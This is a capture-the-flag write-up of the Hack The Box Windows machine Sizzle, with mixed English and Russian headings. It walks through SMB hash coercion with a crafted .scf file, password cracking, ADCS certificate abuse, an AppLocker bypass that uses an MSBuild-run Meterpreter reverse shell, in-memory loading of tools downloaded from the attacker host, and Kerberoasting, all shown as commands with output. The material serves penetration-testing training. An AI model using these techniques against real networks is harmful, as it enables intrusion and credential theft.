---
title: "[HTB] Sizzle"
permalink: /writeups/htb/sizzle/
excerpt: "Краткий разбор машины Sizzle с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - cert
  - scf
---

---

{% include toc icon="cog" title="Sizzle Solution" %}

The [Sizzle](https://app.hackthebox.com/machines/Sizzle) machine has been created by [mrb3n](https://app.hackthebox.com/users/2984) and [lkys37en](https://app.hackthebox.com/users/709). This is an **insane** Windows Machine with a strong focus on Active Directory exploitation. It was really interesting, especially on the Certificate Service side. We had to *guesstimate* some part of the attack path but, it is still a nice machine.
{: .text-justify}

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_sizzle_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.250.238
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 13:24 EST
Nmap scan report for 10.129.250.238
Host is up (0.018s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.44 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

Okay, we are on the domain controller for **htb.local** and we have a few interesting open ports, including **HTTP** (80/TCP) and **HTTPS** (443/TCP).

## HTTP-разведка

Let's start by doing a quick HTTP reconnaissance with [gobuster](https://github.com/OJ/gobuster), a tool to brute-force directories and files. Here we used a common wordlist to enumerate the directories.

```bash
$ gobuster dir -u http://10.129.250.238 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.250.238
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/04 15:17:47 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 159] [--> http://10.129.250.238/aspnet_client/]
/certenroll           (Status: 301) [Size: 156] [--> http://10.129.250.238/certenroll/]   
/certsrv              (Status: 401) [Size: 1293]                                          
/images               (Status: 301) [Size: 152] [--> http://10.129.250.238/images/]       
/Images               (Status: 301) [Size: 152] [--> http://10.129.250.238/Images/]       
/index.html           (Status: 200) [Size: 60]                                            
                                                                                          
===============================================================
2022/06/04 15:18:02 Finished
===============================================================
```

We have some interesting findings, especially the [/certsrv](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) page which corresponds to the CA Web enrollment page. However, it seems we that need some credentials to get an access to the service.

![image-center](/images/htb/htb_sizzle_certsrv.png){: .align-center}

We will probably get back to that later, let's keep going.

## SMB Shares

We could try to find some open shares via an *anonymous* login on the target machine with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html).

```bash
$ smbclient -N -L \\\\10.129.250.238

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Here we can see a few folders. Let's start by looking at the **Department Shares** folder.

```bash
$ smbclient "\\\\10.129.250.238\\Department Shares"
Enter WORKGROUP\ax password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018

                7779839 blocks of size 4096. 3145080 blocks available
smb: \> 
```

Now, by checking the **Users** folder we might get some usernames and discover some folders with weak permissions.

```bash
smb: \> cd users\
smb: \users\> ls
  .                                   D        0  Tue Jul 10 17:39:32 2018
  ..                                  D        0  Tue Jul 10 17:39:32 2018
  amanda                              D        0  Mon Jul  2 15:18:43 2018
  amanda_adm                          D        0  Mon Jul  2 15:19:06 2018
  bill                                D        0  Mon Jul  2 15:18:28 2018
  bob                                 D        0  Mon Jul  2 15:18:31 2018
  chris                               D        0  Mon Jul  2 15:19:14 2018
  henry                               D        0  Mon Jul  2 15:18:39 2018
  joe                                 D        0  Mon Jul  2 15:18:34 2018
  jose                                D        0  Mon Jul  2 15:18:53 2018
  lkys37en                            D        0  Tue Jul 10 17:39:04 2018
  morgan                              D        0  Mon Jul  2 15:18:48 2018
  mrb3n                               D        0  Mon Jul  2 15:19:20 2018
  Public                              D        0  Sat Jun  4 15:45:32 2022

                7779839 blocks of size 4096. 3146808 blocks available
```

After looking around for a few minutes, we couldn't find any interesting files in the shared folders. However, we found out that the **Public** folder was **writable**. Maybe we could upload an *.scf* file to force a user to connect on our machine.

**How did you get there ?** If we had multiple machines, this would be a valid pentest scenario to try to coerce an authentication on our machine, but we had to think this challenge as what it is, a CTF and this was the best path :)
{: .notice--success}

# Первичный доступ

Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

## Forced Authentication

According to the [MITRE](https://attack.mitre.org/techniques/T1187/), adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept. The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource, it will automatically attempt to authenticate and send credential information for the current user to the remote system.

For example, a modified **.LNK** or **.SCF** file with the icon filename pointing to an external reference will force the system to load the resource when the icon is rendered to repeatedly gather credentials.

Using the following [article](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf) let's see if we can coerce any user to authenticate to our machine and grab a hash. First, we created a simple **.scf** file named *hello.scf*.

```bash
[Shell]
Command=2
IconFile=\\10.10.14.20\share\whatever.ico
[Taskbar]
Command=ToggleDesktop
```

Then, we uploaded the file to the **Public** folder using `smbclient`.

```bash     
smb: \users\Public\> put hello.scf 
putting file hello.scf as \users\Public\hello.scf (0.6 kb/s) (average 0.6 kb/s)
smb: \users\Public\> ls
  .                                   D        0  Sat Jun  4 15:51:50 2022
  ..                                  D        0  Sat Jun  4 15:51:50 2022
  hello.scf                           A       47  Sat Jun  4 15:51:50 2022

                7779839 blocks of size 4096. 3146287 blocks available
smb: \users\Public\> 
```

Finally, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, as listener we were able to capture a hash for the **amanda** account.

```bash
$ sudo responder -I tun0

...[snip]...

[+] Listening for events... 

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.250.238
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:8a7e87c1233bc727:D2FE0898E458F50CE1058E063C2E11BE:010100000000000000CF78A4A921D801AC2B3950B152C1C4000000000200080031004B005000410001001E00570049004E002D00500031004800450031004400370050005A003100570004003400570049004E002D00500031004800450031004400370050005A00310057002E0031004B00500041002E004C004F00430041004C000300140031004B00500041002E004C004F00430041004C000500140031004B00500041002E004C004F00430041004C000700080000CF78A4A921D8010600040002000000080030003000000000000000010000000020000059F2C79AD3F324A2CB03F298893ECE8E71C147E0FE3F16F742F2FBA88ADBD0A30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003800000000000000000000000000      
```

## Взлом пароля

Now, we just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)     
1g 0:00:00:10 DONE (2022-02-14 13:53) 0.09727g/s 1110Kp/s 1110Kc/s 1110KC/s Ashiah08..Arsenic
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Great, we now have credentials for **amanda** (`amanda:Ashare1972`). Let's check those credentials with `crackmapexec`.

```bash
$ crackmapexec smb 10.129.250.238 -u amanda -p Ashare1972
SMB         10.129.250.238   445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.250.238   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
```

Nice, maybe we can use `evil-winrm` with these credentials.

```bash
$ evil-winrm -i 10.129.250.238 -u amanda -p Ashare1972

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Sat, 04 Jun 2022 21:34:14 GMT", "Connection"=>"close", "Content-Length"=>"0"}                                                                                                                           
Body:  (401). 
Error: Exiting with code 1
```

It looks like a no.

## ADCS 

Given we do have a Certificate Authority, maybe it needs a certificate instead of a password. Let's see if we can access to *http://10.129.250.238/certsrv/* with our credentials (`amanda:Ashare1972`).

![image-center](/images/htb/htb_sizzle_amanda.png){: .align-center}

Now we need to create a certificate signing request (CSR) to request a certificate. [openssl](https://www.openssl.org/docs/manmaster/man1/openssl.html) is our goto tool here. First, we generate an RSA private key.

```bash
$ $ openssl genrsa -des3 -out amanda.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
...........................................+++++
..+++++
e is 65537 (0x010001)
Enter pass phrase for amanda.key:
Verifying - Enter pass phrase for amanda.key:
```

Then, we create the CSR. We can leave every field empty as it is not really important here.

```bash
$ openssl req -new -key amanda.key -out amanda.csr
Enter pass phrase for amanda.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

The newly created CSR should be in the *amanda.csr* file.

```bash             
$ cat amanda.csr                                                                                        
-----BEGIN CERTIFICATE REQUEST-----
MIICiPlcndSuhQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCAStngfYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAMpp+NjBnP6+p/PXOEhm6st8C3ZaQfxU4/zmNf9c
mQ2RNJFMLlSD8aIUCephgIj5kk6cYgO/66LjdRcPeKjndN9L/w2/I0EtXd8Q3TZQ
HPEhRzvp+bksVUkhGWU7JgCMbff3UCXL7FmBnwWMFjBKDdL8uSxsPaTDgjpjOZgd
SjMrn9Tyy+Vrrm+U5I7eEUMLXwxAQtzIx28wTOezTnTkZ/kaFeyyaBtAJhS2+MUr
vJl9fopRRF5wkhT9sbZblbfpMoR8BqVNKcBmQur9NvRIsCm9BdmBGl9dz04Lqz+W
6DBmTiVerjtba+tQgvkZHsJBofIgFRJrFA4gcQHRZ/wOA3sCAwEAAaAAMA0GCSqG
SIb3DQEBCwsd4IBAQCm58wnXhGltLhZEWCxc2HFTE0nxeWVqladv5q1nU2YcY8wU
H+GvzhIvlO4hBQcIG4U7BnN9gB+Prra4YQYSpHx1G6erH5Z9kjVGGIFSRwm1VWfd
mRT7zgGCdkIZ4dkyM3+NOI8OYg9sYefLc+juEvk4Oqsah70PRSwyACOC9SHPwQgZ
htmA+Pgr1FZ9gn3cvGMwJib6P3KYbcb9qm0lluTJPsg9WLSvv09vKfKLv8Yw57y/
jrkWQm6mnqe1wtx2HachmUVyMLfD9d0dFSa6loW74lmhm3kYhrHd9tWyAigHKMzI
2aHrra732sLVi017IAI2hZ6c/KqBgz4oI4aSMXoV
-----END CERTIFICATE REQUEST-----
```

Open the newly created CSR and copy/paste it on *http://10.129.250.238/certsrv/*. We just need to click on **Request a certificate**, then **advanced certificate request** and paste our CSR.

![image-center](/images/htb/htb_sizzle_cert_01.png){: .align-center}

Once the certificate is generated, we can download it (no need to download the chain) as Base64 on our attacking machine.

![image-center](/images/htb/htb_sizzle_cert_02.png){: .align-center}

## WinRM

Finally, let's try again with `evil-winrm` and our newly created certificate. Here we will need to use the `-k` switch for the private key, the `-c` switch for the public key and `-S` to enable SSL.

```bash
$ evil-winrm -i 10.129.250.238 -k amanda.key -c Downloads/certnew.cer -S

Evil-WinRM shell v3.3
Warning: SSL enabled
Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\amanda\Documents>
```

This time we got a shell but no flag, yet.

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Bypassing CLM/AppLocker

As our PowerShell shell runs with [constrained language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) (CLM), we cannot execute our fancy scripts. Basically, CLM restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs. Here is a quick example with [PrivescCheck](https://github.com/itm4n/PrivescCheck):

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
*Evil-WinRM* PS C:\Users\amanda\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck
Enter PEM pass phrase:
Cannot create type. Only core types are supported in this language mode.
At line:1 char:5
+ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/Priv ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException
    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand

...[snip]...
```

We get a nice error message. Moreover, [AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) is enabled so we cannot download our offensive tools and execute them on the target machine. Here is an example with [Rubeus](https://github.com/GhostPack/Rubeus):

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.14.20/Rubeus.exe -outfile Rubeus.exe
*Evil-WinRM* PS C:\Users\amanda\Documents> ./Rubeus.exe
Program 'Rubeus.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ ./Rubeus.exe
+ ~~~~~~~~~~~~.
At line:1 char:1
+ ./Rubeus.exe
+ ~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\amanda\Documents> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe
    EnforcementMode    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\a61c8b2c-a319-4cd0-9690-d2177cad7b51
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\d754b869-d2cc-46af-9c94-6b6e8c10d095
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fd686d83-a829-4351-8ff4-27c7de5755d2
```

However, like many other security systems, they have flaws and can be bypassed. There are many things we could do here, like searching for potential flaws in the AppLocker policy. For our current use case, we will use an *unmanaged* way to execute PowerShell that is based on [MSBuild.exe](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/). The tool is called [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) and can generate **.csproj** file to run with **MSBuild.exe**, which is signed by Microsoft and will bypass AppLocker.

First, let's generate a reverse shell with **msfvenom**. Also, we added an encryption layer with **shikata_ga_nai**, just in case.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=445 -e x86/shikata_ga_nai -f raw -o sizzle.raw
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Saved as: sizzle.raw
```

Then, using **PowerLessShell**, we generated our **.csproj** payload.


```bash
$ python2 PowerLessShell.py -source sizzle.raw -output sizzle.csproj
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-shellcode.csproj as the template
File 'sizzle.csproj' created
Process completed
```

Finally, we can upload our payload using `iwr` on the target machine. Note that the file was first hosted on our attacking machine using the **Apache**.

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.14.20/sizzle.csproj -outfile sizzle.csproj
*Evil-WinRM* PS C:\Users\amanda\Documents> ls

    Directory: C:\Users\amanda\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2022   6:18 PM           6660 sizzle.csproj
```

Then, before executing `msbuild.exe`, we created a Metasploit handler for our payload.

```bash
$ sudo msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.20; set LPORT 445; exploit"
[sudo] password for ax: 
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 10.10.14.20
LPORT => 445
[*] Started reverse TCP handler on 10.10.14.20:445 
```

Finally, we can run the payload using **msbuild.exe**. Make sure to provide the full path for **msbuild.exe**.

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sizzle.csproj

Microsoft (R) Build Engine version 4.6.1586.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 6/4/2022 6:19:54 PM.
```

If we take a look at the Metasploit listener, we can see that we have a callback.

```bash
[*] Sending stage (175174 bytes) to 10.129.250.238
[*] Meterpreter session 1 opened (10.10.14.20:445 -> 10.129.250.238:51475) at 2022-06-04 18:19:56 -0400

meterpreter > sysinfo 
Computer        : SIZZLE
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
```

Now, let's run PowerShell, this time in **FullLanguage**. To do that, we will use the `powershell` module provided by our Meterpreter shell.

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS > $ExecutionContext.SessionState.LanguageMode 
FullLanguage
```

Awesome, however, we are still constrained by **AppLocker**, but it does not really matter as we can run everything in memory. 

## Разведка Active Directory

Here, if we want to run [SharpHound](https://github.com/BloodHoundAD/BloodHound) in-memory through a PowerShell wrapper, first, we need to base64-encode the assembly.

```bash
$ base64 SharpHound.exe -w0 > SharpHound.txt
```

Then, we can load it into our PowerShell session.

```bash
PS > $SharpAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((new-object net.webclient).downloadstring('http://10.10.14.20/SharpHound.txt')))
PS > [Sharphound.Program]::Main(" -d htb.local")


Result                 : System.Threading.Tasks.VoidTaskResult
Id                     : 1370
Exception              :
Status                 : RanToCompletion
IsCanceled             : False
IsCompleted            : True
CreationOptions        : None
AsyncState             :
IsFaulted              : False
AsyncWaitHandle        : System.Threading.ManualResetEvent
CompletedSynchronously : False

PS > ls

    Directory: C:\Users\amanda\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2022   7:17 PM          10893 20220604191736_BloodHound.zip
-a----         6/4/2022   7:17 PM           8127 MjA1NTZjODAtYTQzYS00OWY1LWFiOTAtMjFmYTQ1MmY1YTU4.bin
-a----         6/4/2022   6:18 PM           6660 sizzle.csproj
```

Now, using Meterpreter, we can download the results and start our analysis.

```bash
PS > ^Z
Background channel 1? [y/N]  y
meterpreter > download 20220604191736_BloodHound.zip
[*] Downloading: 20220604191736_BloodHound.zip -> /home/ax/20220604191736_BloodHound.zip
[*] Downloaded 10.64 KiB of 10.64 KiB (100.0%): 20220604191736_BloodHound.zip -> /home/ax/20220604191736_BloodHound.zip
[*] download   : 20220604191736_BloodHound.zip -> /home/ax/20220604191736_BloodHound.zip
```

Using Bloodhound's results, let's see if we can gain our initial foothold on the machine by identifying interesting privileges or attack paths, starting with our compromised user. 

![image-center](/images/htb/htb_sizzle_mrlky.png){: .align-center}

After a few checks, it seems that have an interesting attack path. The user **mrlky** has the *DS-Replication-Get-Changes-All* privilege on the domain HTB.LOCAL and this user seems to be [Kerberoastable](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting).

If we can compromise **mrlky** account, we may be able to perform a DCSync attack.

## Kerberoasting

[Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) is an interesting technique that only requires a valid account on the targeted domain. Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any **SPN** from a domain controller. 

Portions of these tickets may be encrypted with the **RC4** algorithm, meaning the *Kerberos 5 TGS-REP etype 23* hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

Here, we can use [Rubeus](https://github.com/GhostPack/Rubeus) to find Service Principal Names (SPN) that are associated with a user account and request a TGS.

Here, if we want to run [Rubeus](https://github.com/GhostPack/Rubeus) in-memory through a PowerShell wrapper, again, we need to base64-encode the  assembly.

```bash
$ base64 Rubeus.exe -w0 > Rubeus.txt
```

Then, we can load it into our PowerShell session and request **mrlky** hash with **amanda** credentials.

```bash
PS > $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((new-object net.webclient).downloadstring('http://10.10.14.20/Rubeus.txt')))
PS > [Rubeus.Program]::MainString("kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972")

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : HTB.LOCAL
[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] PwdLastSet             : 7/10/2018 2:08:09 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$1B08111E846707B3D6DC056F632D
                             4399$3B42A17F2D2B89E23DD2176AAE71F8BFECC3A3D40EB9EE8BED6FAF55AB8BB0BF975FCAFC087
                             0A9DAD538CD87FE0C00D6D07E6C9AEFF7DB23CA1BDD69A047E48718AF2090BBE476AF21320C1DBDE
                             7C0C16F1170CDC129D7C2C3D9C9F76112703FCC48023682876B95124857B7F7B44322D5224425F3B
                             5C8F7C5DE4E0F3778466A58C455D34FADE7E6C27C0BE3D7763B76EA0CC23C46952580A604D1C74AC
                             8B8DD7A001505DC1764328BB961B794EAA3860606B7059E618EEF65C6E543F20C14EC2DA312BA4B6
                             43C6087FD066C70D8F1FDFD77930F28CBC63A8DB89B13309D741D92BD8F69654CE09BFFB4F77A723
                             9C4FE61086939D642E1EA806502AEA97139819AECC02BBB810A71EC8E0871E55218BA65C98ECB088
                             A56F0C0FC6D859CEE3DEDE4DE6B87ACB6034C49CFE51724C125E5421818381FCA43344996CBDD912
                             D5BE2E92B5667C51C03B547294E7738A0A73064F6F51DAEDDFCACFA264AEF35C8E4D72C74D028041
                             C12BA6E82C877FD965BF169836E30E223D2E19E3BBBCBBC703C756BEF25DCB78F13306235A635798
                             AF9A01B1054638BC3445AB4F8E7F11119C50F014AE7570F15B735F11539B3E0F6AAAB68D0890FC70
                             6C9D34411E35A6FF226A24EBC322F9C0F883BB9B9DC4297CCB41AA65DDA059D3F544E8AC047DE3F2
                             71577E2E52A25836E53A8F46570995502A6EA6E29F4C8FB5CD20C3BDBE3844B9106335507902A1B9
                             F7187C74A74417B4EE8688B8EB2984B2440FB0A9D1FA88B3BA01AD270F7DA2FEEA69E0AC60394DF8
                             0981C2DAD7C62674DEFD4D1B0CCDE1E824A44420E1E46C626124E0AB97DF5CC12A61A3A402DF08AA
                             7D89569A1566B8F323F7848A8924EA6A7DBD8F8D8B9BB5D5D9C2E7E706F54BF9F4DA7F48089278EB
                             403548EBEF50B536D8B556E39A50E441251B90613A0708073D791474E1A77ADD142CCF88E3B7B2A6
                             F88CF6FE3B6DBEB2CA5D1CD4D54308051F82ABF20DB58B6CCB6D07C03CABAB690E986DEB889EEBA8
                             8D1FCB7DB073C6661525B7DCD82E4A3AD4D49619390C7713B9DAEFD89FD187710EACFDF517FD2D67
                             26D43A19ED4AD0D2A78D3A113AEA19C670D92FFD8A9DF88B70C1764511B720EFD1E5019DF8C5606F
                             F724D7ADA558F864A47C4E97300DAB81BEB0A71C9965471BDC0C7C2360C195A8B4D3322DC3A25510
                             BCCF66503D627001883DC5D1F47741DEF8A4EDE775620BCA9F630B26EAC1EF30439A9E358E2922AE
                             78F35D4749A7BB371B4ABE18335BC1BE2E5002F0706A60ED11E3B894B5422F6F60AD20A44C7B497F
                             797F1D116A6F548306325FB82DF5116FC3D401DB337D97C60533DB1FF5A65393B08F5169B56A6B57
                             0DEE480EB16A059D9
```

